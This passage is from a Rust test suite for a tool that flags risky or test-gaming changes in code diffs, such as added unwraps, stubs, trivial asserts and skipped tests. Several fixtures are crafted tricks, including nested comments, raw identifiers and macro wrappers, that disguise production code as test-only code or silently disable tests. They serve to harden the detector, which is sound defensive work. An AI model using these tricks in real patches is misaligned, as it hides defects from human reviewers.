        // one line that holds a call of each
        for (line, marked) in [
            (
                "+#[test] fn check() {} fn production() { b().unwrap(); }",
                false,
            ),
            (
                "+#[test] fn check() { a().unwrap(); } fn production() { b().unwrap(); }",
                false,
            ),
            ("+#[test] fn check() { a().unwrap(); }", true),
        ] {
            assert_eq!(
                marks(&hunk_of("src/a.rs", &[line])),
                [(S::PanicPathAdded, 2, marked)],
                "{line}"
            );
        }
        // A test inside another macro's body. The parser did not read there and the item had
        // no hint; the tokens of a macro's body are tokens like any other, and it has one.
        let in_macro = hunk_of(
            "src/a.rs",
            &[
                "+outer! {",
                "+    #[test]",
                "+    fn check() {",
                "+        f().unwrap();",
                "+    }",
                "+}",
            ],
        );
        assert_eq!(marks(&in_macro), [(S::PanicPathAdded, 5, true)]);
        // only a panic path carries the mark
        let other = hunk_of(
            "tests/a.rs",
            &["+#[test]", "+fn a() {", "+    todo!();", "+}"],
        );
        assert_eq!(marks(&other), [(S::StubAdded, 4, false)]);
        // A hunk with a line of 70 KB. The parser did not read such a hunk, so nothing was
        // known and nothing was marked; no size switches the token reader off.
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        let large = hunk_of("src/a.rs", &["+#[test]", "+fn a() {", long.as_str(), "+}"]);
        assert_eq!(marks(&large), [(S::PanicPathAdded, 4, true)]);
        // a hint weakens nothing: the score is the score of the same call anywhere
        let unmarked = hunk_of(
            "src/a.rs",
            &["+fn a() {", "+    f().unwrap();", "+}", "+// x", "+// y"],
        );
        assert_eq!(
            crate::risk::score_file(&test).0,
            crate::risk::score_file(&unmarked).0
        );
    }

    /// Review V3 round 5, VD3R5-H-1. One section creates a file whose `#[cfg(test)]` a line
    /// comment follows; a later section for the same path prepends `/*`. Git applies both, and
    /// the function is in the program. Before, the panic path was withdrawn; then a plan
    /// counted the sections that name a path. Since 2026-11-14 a created file is read like any
    /// hunk, and since the parser left there is no plan: alone or beside another section, in
    /// either order, the item stands.
    #[test]
    fn a_created_file_is_read_like_any_other_hunk() {
        let created = "diff --git a/src/d.rs b/src/d.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/d.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)] // */\n+fn production() {\n+    load().unwrap();\n+}\n";
        let prepended = "diff --git a/src/d.rs b/src/d.rs\n--- a/src/d.rs\n+++ b/src/d.rs\n@@ -1,1 +1,2 @@\n+/*\n #[cfg(test)] // */\n";
        let stands = [(S::PanicPathAdded, Basis::Lexical, 3)];
        let alone = parse(created).unwrap();
        assert_eq!(found(&alone[0]), stands);
        assert!(file_evidence(&alone[0])[0].test_likely);
        let mut both = parse(created).unwrap();
        both.extend(parse(prepended).unwrap());
        let mut reversed = parse(prepended).unwrap();
        reversed.extend(parse(created).unwrap());
        for files in [both, reversed] {
            let at = files
                .iter()
                .position(|file| {
                    file.path == "src/d.rs" && file.patch_twin.hunks[0].lines.len() == 4
                })
                .unwrap();
            assert_eq!(found(&files[at]), stands);
            let ranked = crate::rank(&files);
            let created = ranked
                .iter()
                .find(|file| file.evidence.len() == 1)
                .expect("the created file is ranked with its item");
            assert_eq!(created.evidence[0].signal, S::PanicPathAdded);
        }
    }

    /// Independent review, IR-H-1. The withdrawal went by line: a production function that
    /// shares a line with a proved test function lost its panic path whenever the parser named
    /// no construct for it (the function form, or a call inside a macro's arguments). Compiled
    /// and run, both functions panicked. Nothing is withdrawn now; what goes by the line is
    /// the hint, and a line has it only when every panic path on it stands inside an item
    /// that spells a test.
    #[test]
    fn a_production_call_on_the_line_of_a_test_stands_and_has_no_hint() {
        let marks = |body: &[&str]| -> Vec<(EvidenceSignal, u32, bool)> {
            file_evidence(&new_file("src/a6.rs", body))
                .iter()
                .map(|e| (e.signal, e.line, e.test_likely))
                .collect()
        };
        assert_eq!(
            marks(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
                "pub fn production2() -> u32 { vec![crate::b().unwrap()][0] } #[cfg(test)] fn t2() { a().unwrap(); }",
            ]),
            [(S::PanicPathAdded, 2, false), (S::PanicPathAdded, 3, false)]
        );
        // the controls: the test function alone on its line has the hint, with the attribute
        // on the line above or on the same line, and a comment after it is not code. Each of
        // these was withdrawn before 2026-11-14.
        for (body, line) in [
            (&["#[cfg(test)]", "fn t() { a().unwrap(); }"][..], 2),
            (
                &["#[cfg(test)] fn t() { a().unwrap(); } // only in tests"][..],
                1,
            ),
            (
                &[
                    "#[cfg(test)]",
                    "mod t {",
                    "    fn f() { vec![b().unwrap()][0] }",
                    "}",
                ][..],
                3,
            ),
        ] {
            assert_eq!(marks(body), [(S::PanicPathAdded, line, true)], "{body:?}");
        }
        // and the hint goes the same way: a production call in a macro's arguments beside a test
        let hinted: Vec<bool> = file_evidence(&hunk_of(
            "src/a.rs",
            &["+#[test] fn check() { a().unwrap(); } pub fn p() -> u32 { vec![b().unwrap()][0] }"],
        ))
        .iter()
        .map(|item| item.test_likely)
        .collect();
        assert_eq!(hinted, [false]);
    }

    /// Independent review, IR-H-2 and IR-L-1, and the second independent review, IR2-H-1 to
    /// IR2-H-4. Each of these is a new file in which the grammar sees a top-level item under
    /// an exact `#[cfg(test)]`, with no error in the tree, and the compiler sees production
    /// code: a first line the grammar reads as a shebang, a statement at the top level, a
    /// `//*` inside a block comment (the grammar does not count the nested opener), a
    /// character whose low byte is `*` or `/` (the grammar's scanner cuts it to eight bits), a
    /// comment the lexer's code view ends too early, and a `cr"\"` that is a raw string only
    /// from edition 2021. Each was compiled and run to a panic, and each gave no evidence. The
    /// parser removes nothing now, so each reports its panic path.
    #[test]
    fn a_file_the_compiler_reads_otherwise_keeps_its_panic_path() {
        for (body, line) in [
            (
                &[
                    "#! /**/ [allow(unused)] /*",
                    "#[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                4,
            ),
            (
                &[
                    "---x",
                    ";#[cfg(test)] /*",
                    "---",
                    "// */",
                    "mod t {",
                    "    pub fn production() -> u32 { super::b().unwrap() }",
                    "}",
                ][..],
                6,
            ),
            // IR2-H-1
            (
                &[
                    "/* //* */ #[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                3,
            ),
            // IR2-H-2, both ways
            (
                &[
                    "macro_rules! live { (#[cfg(test)] $($rest:tt)*) => { $($rest)* }; }",
                    "/* įĪ */ live! { // */",
                    "#[cfg(test)]",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                    "/* įĪ */ } // */",
                ][..],
                5,
            ),
            (
                &[
                    "/* /* Īį */ #[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                3,
            ),
            // IR2-H-3, with a method call and with the function form
            (
                &[
                    "#[cfg(test)]",
                    "fn t() { a().unwrap(); /* /* */ \" */ } pub fn production() -> u32 { crate::b().unwrap() }",
                    "/* /* */ } */",
                ][..],
                2,
            ),
            (
                &[
                    "#[cfg(test)]",
                    "fn t() { a().unwrap(); /* /* */ // */ } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
                    "/* /* */ } */",
                ][..],
                2,
            ),
            // IR2-H-4
            (
                &[
                    "macro_rules! live { ($a:ident $b:literal $($rest:tt)*) => { $($rest)* }; }",
                    "live! { cr\"\\\" }",
                    "#[cfg(test)] pub mod t { // \"",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                4,
            ),
        ] {
            let items = found(&new_file("src/s.rs", body));
            assert!(
                items
                    .iter()
                    .any(|item| (item.0, item.2) == (S::PanicPathAdded, line)),
                "{body:?}: {items:?}"
            );
        }
    }

    /// Second independent review, IR2-L-1 and IR2-M-2, closed 2026-11-14 (review round 12).
    /// The compiler nests block comments, and the code view now does: it reads Rust as the
    /// compiler's lexer reads it. After `/* /* */ " */` and after `/* /* */ // */` the rest of
    /// the line is code, so the production function there is seen: the line holds a panic
    /// path outside the test function too and loses its hint, as it did while a parser read
    /// the hunk. Until then the view ended the comment at the first `*/` and took the rest of
    /// the line for a string or a comment: the hint was wrong on these two lines, and a call
    /// that stood alone after such a comment left nothing (it was declared).
    #[test]
    fn after_a_nested_comment_the_hint_is_the_code_views() {
        let hints = |body: &[&str]| -> Vec<(u32, bool)> {
            file_evidence(&new_file("src/n1.rs", body))
                .iter()
                .filter(|e| e.signal == S::PanicPathAdded)
                .map(|e| (e.line, e.test_likely))
                .collect()
        };
        // (as while the parser read; `true`, both, while the view did not nest the comment)
        assert_eq!(
            hints(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); /* /* */ \" */ } pub fn production() -> u32 { crate::b().unwrap() }",
            ]),
            [(2, false)]
        );
        assert_eq!(
            hints(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); /* /* */ // */ } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
            ]),
            [(2, false)]
        );
        // the control: the test function alone, with the same comment, has the hint
        assert_eq!(
            hints(&["#[cfg(test)]", "fn t() { a().unwrap(); /* /* */ \" */ }",]),
            [(2, true)]
        );
        // With no other call on the line, what stands after such a comment is found (the
        // parser named these three; they left nothing while the view did not nest: second
        // independent review, IR2-M-2).
        for (line, signal) in [
            (
                "+    /* /* */ // */ let v = Result::unwrap(x);",
                S::PanicPathAdded,
            ),
            ("+    /* /* */ // */ let v = x.unwrap();", S::PanicPathAdded),
            ("+    /* /* */ // */ todo!();", S::StubAdded),
        ] {
            assert_eq!(
                found(&hunk_of("src/p.rs", &[line])),
                [(signal, Basis::Lexical, 2)],
                "{line}"
            );
        }
    }

    /// Independent review, IR-M-2, and the third, IR3-M-2. Inside another macro's body the
    /// parser named no construct, so a construct split over lines there left nothing, then a
    /// mark (`syntax_unchecked`), and in a `macro_rules!` arm nothing again. A macro's body is
    /// tokens like any other: each of these is the item it is.
    #[test]
    fn a_construct_inside_another_macros_body_is_read_like_any_other() {
        let inside = |lines: &[&str]| {
            let mut body = vec![" // ctx", "+outer! {"];
            body.extend_from_slice(lines);
            body.extend_from_slice(&["+}", " // ctx"]);
            found(&hunk_of("src/x.rs", &body))
                .iter()
                .map(|item| item.0)
                .collect::<Vec<_>>()
        };
        // (before: `syntax_unchecked` for each of these, and before that nothing)
        let split: &[(&[&str], &[EvidenceSignal])] = &[
            (&["+    assert!", "+    (true);"], &[S::TrivialAssert]),
            (&["+    assert", "+    !(true);"], &[S::TrivialAssert]),
            (&["+    todo", "+    !();"], &[S::StubAdded]),
            (&["+    let v = x.unwrap", "+    ();"], &[S::PanicPathAdded]),
            (&["+    let v = x.", "+    unwrap();"], &[S::PanicPathAdded]),
            (&["+    #", "+    [ignore]"], &[S::TestSkipped]),
            (&["+    #[", "+    ignore]"], &[S::TestSkipped]),
            (&["+    assert!{true};"], &[S::TrivialAssert]),
            (&["+    assert![true];"], &[S::TrivialAssert]),
            (&["+    todo![];"], &[S::StubAdded]),
            (&["+    unimplemented!{};"], &[S::StubAdded]),
            // a name alone is no assertion
            (&["+    it.map(assert);"], &[]),
        ];
        for (lines, expected) in split {
            assert_eq!(inside(lines), *expected, "{lines:?}");
        }
        let one_line: &[(&[&str], &[EvidenceSignal])] = &[
            (&["+    assert!(a == b);"], &[]),
            (&["+    assert_eq!(a.len(), 3, \"expected three\");"], &[]),
            (&["+    let ignored = unwrap_or(expected, todos);"], &[]),
            (&["+    assert!(true);"], &[S::TrivialAssert]),
            (&["+    x.unwrap();"], &[S::PanicPathAdded]),
            (&["+    todo!();"], &[S::StubAdded]),
            (&["+    #[ignore]", "+    fn a() {}"], &[S::TestSkipped]),
            (&["+    it.map(Result::unwrap);"], &[S::PanicPathAdded]),
        ];
        for (lines, expected) in one_line {
            assert_eq!(inside(lines), *expected, "{lines:?}");
        }
        // outside a macro's body the answer is the same
        assert_eq!(
            found(&hunk_of(
                "tests/x.rs",
                &["+fn a() {", "+    assert!", "+    (true);", "+}"]
            ))
            .iter()
            .map(|item| (item.0, item.1))
            .collect::<Vec<_>>(),
            [(S::TrivialAssert, Basis::Hunk)]
        );
    }

    /// Third independent review, IR3-M-2: the arm of a `macro_rules!` definition. The parser
    /// marked what it could not read inside a macro's invocation, and an arm of a definition
    /// is another kind of node: a construct split over lines there left neither an item nor a
    /// mark. Each of these compiled and ran (a panic; a test that passes; a test that does
    /// not run). The review's files, whole.
    #[test]
    fn a_construct_in_the_arm_of_a_macro_definition_is_read() {
        let arms: &[(&[&str], EvidenceSignal, u32)] = &[
            (
                &[
                    "macro_rules! get {",
                    "    ($x:expr) => {",
                    "        $x.unwrap",
                    "        ()",
                    "    };",
                    "}",
                    "pub fn production(v: Option<u32>) -> u32 {",
                    "    get!(v)",
                    "}",
                ],
                S::PanicPathAdded,
                3,
            ),
            (
                &[
                    "macro_rules! check {",
                    "    ($x:expr) => {",
                    "        assert!(",
                    "            true",
                    "        );",
                    "    };",
                    "}",
                    "#[test]",
                    "fn t() {",
                    "    check!(compute());",
                    "}",
                ],
                S::TrivialAssert,
                3,
            ),
            (
                &[
                    "macro_rules! later {",
                    "    () => {",
                    "        todo",
                    "        !()",
                    "    };",
                    "}",
                    "pub fn production() -> u32 {",
                    "    later!()",
                    "}",
                ],
                S::StubAdded,
                3,
            ),
            (
                &[
                    "macro_rules! skipped {",
                    "    ($name:ident) => {",
                    "        #[test]",
                    "        #[",
                    "          ignore]",
                    "        fn $name() { assert_eq!(compute(), 4); }",
                    "    };",
                    "}",
                    "skipped!(checks);",
                ],
                S::TestSkipped,
                4,
            ),
            (
                &[
                    "macro_rules! get {",
                    "    ($x:expr) => {",
                    "        Option::",
                    "        unwrap($x)",
                    "    };",
                    "}",
                    "pub fn production(v: Option<u32>) -> u32 {",
                    "    get!(v)",
                    "}",
                ],
                S::PanicPathAdded,
                3,
            ),
            // the review's control: the same two lines inside `vec![…]`
            (
                &[
                    "pub fn production(v: Option<u32>) -> u32 {",
                    "    vec![v.unwrap",
                    "        ()][0]",
                    "}",
                ],
                S::PanicPathAdded,
                2,
            ),
        ];
        for (body, signal, line) in arms {
            assert_eq!(
                found(&new_file("src/mr.rs", body)),
                [(*signal, Basis::Hunk, *line)],
                "{body:?}"
            );
        }
    }

    /// Independent review, IR-M-3: a conditional skip whose condition changed is another skip.
    /// The test ran everywhere but under Miri and now runs nowhere. The construct is the list
    /// from its `#` to its `ignore`, so a token added anywhere in the condition is a token of
    /// it on an added line.
    #[test]
    fn a_conditional_skip_whose_condition_changed_is_evidence() {
        let changed = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "-    miri,",
                "+    all(),",
                "     ignore",
                " )]",
                " fn slow() {",
            ],
        ));
        assert_eq!(changed, [(S::TestSkipped, Basis::Hunk, 4)]);
        // Second independent review, IR2-M-1: the comparison went by the attribute's words,
        // which leave out what is nested in a list and what is a string. Each of these changes
        // the condition under which the test is skipped, and each was "the same attribute".
        // The last two only respace the line: once they were told apart from a change, by
        // comparing the old attribute's text; nothing is compared with the old side now, a
        // line written again inside the condition is a change to it, and they are reported.
        // It errs toward evidence.
        for (before, after) in [
            ("all(miri),", "all(),"),
            ("not(any()),", "not(miri),"),
            ("target_os = \"plan9\",", "target_os = \"linux\","),
            ("feature = \"never-enabled\",", "feature = \"default\","),
            ("any(miri),", "any(miri, unix, windows),"),
            ("all(miri),", "all( miri ) ,"),
            ("all(miri),", "    all(miri),"),
        ] {
            let (removed, added) = (format!("-    {before}"), format!("+    {after}"));
            let condition = found(&hunk_of(
                "tests/slow.rs",
                &[
                    " #[test]",
                    " #[cfg_attr(",
                    &removed,
                    &added,
                    "     ignore",
                    " )]",
                    " fn slow() {",
                ],
            ));
            assert_eq!(
                condition,
                [(S::TestSkipped, Basis::Hunk, 4)],
                "{before} to {after}"
            );
        }
        // A line added beside the attribute and not in it: no evidence.
        let beside = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "     all(miri),",
                "     ignore",
                " )]",
                "+#[inline]",
                " fn slow() {",
            ],
        ));
        assert_eq!(beside, []);
        // Only the reason changed: the `ignore` is on the line that was written again.
        let reason = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "     miri,",
                "-    ignore = \"slow\"",
                "+    ignore = \"very slow\"",
                " )]",
                " fn slow() {",
            ],
        ));
        assert_eq!(reason, [(S::TestSkipped, Basis::Hunk, 5)]);
    }

    /// Third independent review, IR3-M-1. The parser compared an attribute's text with its
    /// whitespace removed, and a newline is not free: moving one changes what is comment and
    /// what is code. Two of the review's three patches add a token to the condition and are
    /// found. The first is declared a miss, and so is its control: the change takes
    /// `feature = "ci",` out of the condition (the test went from failing to ignored, compiled
    /// and run) and the only added line is a comment, so no token of the skip is on an added
    /// line. A change that only removes tokens is not read (see the module's limits).
    #[test]
    fn a_conditional_skip_whose_condition_only_lost_tokens_is_not_read() {
        let at = |body: &[&str]| found(&hunk_of("src/at.rs", body));
        // `at1.patch`: declared miss (the parser: nothing either)
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "     all(",
                "-        // heavy: only on CI",
                "-        feature = \"ci\",",
                "+        // heavy: only on CI feature = \"ci\",",
                "         target_os = \"linux\",",
                "     ),",
                "     ignore",
                " )]",
                " fn checks_the_ledger() {",
            ]),
            []
        );
        // `at1ctl.patch`: declared miss (the parser: `test_skipped`)
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "     all(",
                "-        // heavy: only on CI",
                "-        feature = \"ci\",",
                "+        // heavy: only on CI",
                "         target_os = \"linux\",",
                "     ),",
                "     ignore",
                " )]",
                " fn checks_the_ledger() {",
            ]),
            []
        );
        // `at2.patch` and `at3.patch`: found (the parser: nothing)
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "-    // x",
                "-    all(miri), // all(),",
                "+    // x all(miri), //",
                "+    all(),",
                "     ignore)]",
                " fn checks_the_ledger() {",
            ]),
            [(S::TestSkipped, Basis::Hunk, 5)]
        );
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "-    target_os = \"lin ux\",",
                "+    target_os = \"linux\",",
                "     ignore)]",
                " fn checks_the_ledger() {",
            ]),
            [(S::TestSkipped, Basis::Hunk, 4)]
        );
        // Third independent review, IR3-L-3 (`un1.patch`), the same limit: a call on an
        // unchanged line that the change brings to life, by removing the comment around it.
        assert_eq!(
            at(&[
                " pub fn production(x: Option<u32>) -> u32 {",
                "-    /* disabled until the cache is fixed",
                "+    // enabled again",
                "     let v = x.unwrap();",
                "-    */",
                "-    let v = x.unwrap_or(0);",
                "     v",
                " }",
            ]),
            []
        );
    }

    /// Found 2026-11-14 while the rule was taught nested lists; the cost was older. Each
    /// `cfg_attr` list of a line was read from its own start, so lists opened inside one
    /// another cost the square of the line: 80,000 of `#[cfg_attr(` (880 KB) took 32 s to
    /// rank. The lists are followed as the tokens pass, sixteen of them at once at most, and
    /// one opened past that is taken to hold a skip.
    #[test]
    fn the_cfg_attr_lists_of_a_hunk_are_followed_in_one_pass() {
        // the flood in a patch: one item, on its line
        for count in [50_000, 200_000] {
            let flood = format!("+{}", "#[cfg_attr(".repeat(count));
            assert_eq!(
                within_deadline(move || found(&hunk_of("tests/a.rs", &[&flood]))),
                [(S::TestSkipped, Basis::Lexical, 2)],
                "{count}"
            );
        }
        // up to the limit the answer is exact: a nest that applies nothing, lists side by
        // side, and one skip at the end of them
        let nest = format!("+{}", "#[cfg_attr(".repeat(16));
        assert_eq!(found(&hunk_of("tests/a.rs", &[&nest])), []);
        let beside = "#[cfg_attr(a, inline)] ".repeat(10_000);
        assert_eq!(found(&hunk_of("tests/a.rs", &[&format!("+{beside}")])), []);
        assert_eq!(
            found(&hunk_of(
                "tests/a.rs",
                &[&format!("+{beside}#[cfg_attr(a, ignore)]")]
            )),
            [(S::TestSkipped, Basis::Lexical, 2)]
        );
        // the same flood a line each: the lists span lines and are still one pass
        let lines = vec!["+#[cfg_attr("; 100_000];
        assert_eq!(
            within_deadline(move || found(&hunk_of("tests/a.rs", &lines)).len()),
            100_000 - 16
        );
    }

    /// Independent review, IR-L-2 and IR-L-3: an `ignore` that belongs to another attribute is
    /// no skipped test; a function passed by name is a panic path; and `allow` is read
    /// whatever its spacing. (The arguments of a `cfg_attr`, case by case, are in the token
    /// reader's own tests.)
    #[test]
    fn nested_ignore_passed_functions_and_spaced_allow() {
        // each case also on a line of 70 KB: no size changes the answer (a hunk that large
        // was not parsed, and said `syntax_unchecked`)
        let pad = "a".repeat(70_000);
        let serde = "#[cfg_attr(feature = \"serde\", serde(skip, ignore, default))]";
        assert_eq!(
            found(&hunk_of("src/a.rs", &[&format!("+{serde}"), "+struct A;"])),
            []
        );
        assert_eq!(
            found(&hunk_of("src/a.rs", &[&format!("+{serde} // {pad}")])),
            []
        );
        for (arguments, skips) in [
            ("miri, ignore)]", true),
            ("miri, ignore = \"slow\")]", true),
            ("all(a, b), allow(x), ignore)]", true),
            ("miri, ignore", false),
            ("ignore, allow(x))]", false),
            ("miri, allow(ignore))]", false),
            ("feature = \"serde\", serde(skip, ignore, default))]", false),
            ("miri, ignored)]", false),
            ("miri)]", false),
            // second independent review, IR2-M-2: a `cfg_attr` that a `cfg_attr` applies is
            // followed
            ("all(), cfg_attr(all(), ignore))]", true),
            ("all(), cfg_attr ( all() , ignore = \"slow\" ) )]", true),
            ("a, allow(x), cfg_attr(b, inline, ignore))]", true),
            ("a, cfg_attr(b, cfg_attr(c, ignore)))]", true),
            ("a, cfg_attr(b, cfg_attr(c, inline)), ignore)]", true),
            ("a, cfg_attr(b, ignore))]", true),
            // not whole: the side ends before the list's `)]` (round 18 of Vesper's review,
            // VD3R18-M-1)
            ("a, cfg_attr(b, ignore)", false),
            ("a, cfg_attr(b, ignore =", false),
            // and only that: the nested condition, the place of the condition, another
            // attribute's list, a longer name, what follows a nested list that has closed,
            // and an `ignore` that the side ends on (it can go on as `ignore::case`: read
            // from round 13 to round 16; a hunk side is read as text that ends there)
            ("a, cfg_attr(b, ignore", false),
            ("a, cfg_attr(b, ignore::case))]", false),
            ("all(), cfg_attr(ignore, allow(x)))]", false),
            ("cfg_attr(a, ignore), allow(x))]", false),
            ("a, serde(cfg_attr(b, ignore)))]", false),
            ("a, my_cfg_attr(b, ignore))]", false),
            ("a, cfg_attr(b, inline) ignore)]", false),
            (
                "a, cfg_attr(b, cfg_attr(c, inline)))] fn ignore() {}",
                false,
            ),
            ("miri, ignore)] fn a() {}", true),
            ("miri)] fn a() {}", false),
        ] {
            let expected: &[(EvidenceSignal, Basis, u32)] = if skips {
                &[(S::TestSkipped, Basis::Lexical, 2)]
            } else {
                &[]
            };
            let line = format!("+#[cfg_attr({arguments}");
            assert_eq!(found(&hunk_of("tests/a.rs", &[&line])), expected, "{line}");
        }
        // no recursion: a line that nests as deep as it is long
        let (nest, shut) = ("cfg_attr(a, ".repeat(200_000), ")".repeat(200_001));
        let deep = format!("+#[cfg_attr(a, {nest}ignore,{shut}]");
        assert_eq!(
            within_deadline(move || found(&hunk_of("tests/a.rs", &[&deep]))),
            [(S::TestSkipped, Basis::Lexical, 2)]
        );
        let deep = format!("+#[cfg_attr(a, {nest}inline{shut}]");
        assert_eq!(
            within_deadline(move || found(&hunk_of("tests/a.rs", &[&deep]))),
            []
        );
        for line in [
            "+    it.map(Result::unwrap)",
            "+    it.map(Option::expect)",
            "+    let c = <Option<u32>>::unwrap(x);",
            "+    let d = Result::<u32, E>::unwrap(r);",
            "+    let e = Wrapper :: expect (x, \"one\");",
        ] {
            let item = [(S::PanicPathAdded, Basis::Lexical, 2)];
            assert_eq!(found(&hunk_of("src/a.rs", &[line])), item, "{line}");
            assert_eq!(
                found(&hunk_of("src/a.rs", &[&format!("{line} // {pad}")])),
                item,
                "{line}"
            );
        }
        assert_eq!(
            found(&hunk_of(
                "src/a.rs",
                &["+    it.map(Result::unwrap_or_default)"]
            )),
            []
        );
        for line in [
            "+#![allow(unused)]",
            "+#! [allow(unused)]",
            "+# [allow(unused)]",
            "+#[allow(dead_code)]",
        ] {
            assert_eq!(
                found(&hunk_of("src/a.rs", &[line]))
                    .iter()
                    .map(|item| item.0)
                    .collect::<Vec<_>>(),
                [S::CheckSuppressed],
                "{line}"
            );
        }
    }

    /// Review V3 round 8, VD3R8-M-1: `r#unwrap` is the identifier `unwrap` to the compiler
    /// (checked there with rustc), and `x.r#unwrap()` and `X::r#unwrap(x)` left neither an item
    /// nor a mark. A raw identifier is read as the identifier it is: the code view the tokens
    /// are cut from has its prefix blank.
    #[test]
    fn a_raw_identifier_is_read_as_the_identifier_it_is() {
        let pad = "a".repeat(70_000);
        let cases: &[(&str, EvidenceSignal)] = &[
            ("pub fn f(x: X) { x.r#unwrap(); }", S::PanicPathAdded),
            ("pub fn g(x: X) { X::r#unwrap(x); }", S::PanicPathAdded),
            ("pub fn h(x: X) { x.r#expect(\"one\"); }", S::PanicPathAdded),
            ("pub fn i(x: X) { x . r#unwrap (); }", S::PanicPathAdded),
            (
                "pub fn j(it: I) { it.map(Result::r#unwrap); }",
                S::PanicPathAdded,
            ),
            (
                "pub fn k(it: I) { it.map(r#Option :: r#expect); }",
                S::PanicPathAdded,
            ),
            ("fn l() { r#assert!(true); }", S::TrivialAssert),
            ("fn m() { r#todo!(); }", S::StubAdded),
            ("fn n() { r#unimplemented!(); }", S::StubAdded),
            ("#[r#ignore]", S::TestSkipped),
            ("#[r#cfg_attr(miri, r#ignore)]", S::TestSkipped),
            ("#[r#allow(dead_code)]", S::CheckSuppressed),
        ];
        for (line, signal) in cases {
            let read: Vec<EvidenceSignal> = found(&hunk_of("tests/r.rs", &[&format!("+{line}")]))
                .iter()
                .map(|item| item.0)
                .collect();
            assert_eq!(read, [*signal], "{line}");
            // and on a line of 70 KB, which the parser did not read
            let long: Vec<EvidenceSignal> =
                found(&hunk_of("tests/r.rs", &[&format!("+{line} // {pad}")]))
                    .iter()
                    .map(|item| item.0)
                    .collect();
            assert_eq!(long, [*signal], "{line}");
        }
        // not raw identifiers: the opener of a raw string; and a longer name is another name
        for line in [
            "+let a = r#\"x.unwrap()\"#;",
            "+let b = br#\"todo!()\"#;",
            "+let d = x.r#unwrap_or(1);",
            "+let e = it.map(Result::r#unwrap_or_default);",
        ] {
            assert_eq!(found(&hunk_of("src/r.rs", &[line])), [], "{line}");
        }
        assert_eq!(without_raw_prefixes("x.unwrap()"), None);
        assert_eq!(
            without_raw_prefixes("x.r#unwrap(r#\"s\"#, r#fn)").as_deref(),
            Some("x.  unwrap(r#\"s\"#,   fn)")
        );
    }

    /// Review V3 round 9, VD3R9-M-1. A function named by a path is a panic path like the
    /// method call it is: `X::unwrap(x)`, `<Option<u32>>::expect(x, "…")`, and the standard
    /// one passed as a value, `it.map(Result::unwrap)`. A rule that read one line found these
    /// only on one line, so a path broken after its `::` (which compiles to the same call)
    /// left nothing; with the raw spelling `r#unwrap` this was Vesper's file. The tokens of a
    /// hunk are read across its lines, and the item is on the first added line that holds a
    /// token of the call: the line of the dot or of the `::` here, where the parser said the
    /// line of the name.
    #[test]
    fn a_path_call_and_a_path_value_are_panic_paths_over_any_number_of_lines() {
        let vesper = new_file(
            "src/raw.rs",
            &[
                "pub struct X;",
                "impl X { pub fn unwrap(self) {} }",
                "pub fn method(x: X) {",
                "    x.",
                "        r#unwrap();",
                "}",
                "pub fn path(x: X) {",
                "    X::",
                "        r#unwrap(x);",
                "}",
                "pub fn passed(it: impl Iterator<Item = X>) {",
                "    let _ = it.map(X::",
                "        r#unwrap);",
                "}",
                "pub fn standard(it: impl Iterator<Item = Result<u8, ()>>) {",
                "    let _ = it.map(Result::",
                "        r#unwrap);",
                "}",
            ],
        );
        // The method call, the call by a path and the standard function as a value. Declared:
        // the third of the four, `X::unwrap` of the patch's own type passed as a value (lines
        // 12 and 13), is not read. The parser named it (and any path used as a value, a
        // constant named `expect` among them); nothing in the tokens tells such a value from
        // an import, a type or a longer path.
        assert_eq!(
            found(&vesper),
            [
                (S::PanicPathAdded, Basis::Hunk, 4),
                (S::PanicPathAdded, Basis::Hunk, 8),
                (S::PanicPathAdded, Basis::Hunk, 16),
            ]
        );
        let cases: &[(&[&str], &[Item])] = &[
            (
                &["+    let v = X::unwrap(x);"],
                &[(S::PanicPathAdded, Basis::Lexical, 2)],
            ),
            (
                &["+    let v = X::", "+        unwrap(x);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &[
                    "+    let v = <Option<u32>>::",
                    "+        expect(x, \"one\");",
                ],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &["+    let v = Result::<u32, E>::", "+        unwrap(r);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &["+    let v = a::b::", "+        unwrap::<u8>(x);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            // passed as a value: the standard one over two lines, and with generic arguments
            // (second independent review, IR2-M-2: no evidence)
            (
                &["+    let v = it.map(Option::", "+        expect);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &["+    let f = Option::<u32>::unwrap;"],
                &[(S::PanicPathAdded, Basis::Lexical, 2)],
            ),
            // declared, as above: a type of the patch's own, passed as a value
            (&["+    let v = it.map(X::unwrap);"], &[]),
        ];
        for (body, expected) in cases {
            assert_eq!(found(&hunk_of("src/p.rs", body)), *expected, "{body:?}");
        }
        // not panic paths: an import, a longer name, a path that only leads on, a macro of
        // that name, a type, a definition
        for body in [
            &["+use a::expect;", "+use b::{c, unwrap};"][..],
            &["+    let v = X::unwrap_or(x, 1);"][..],
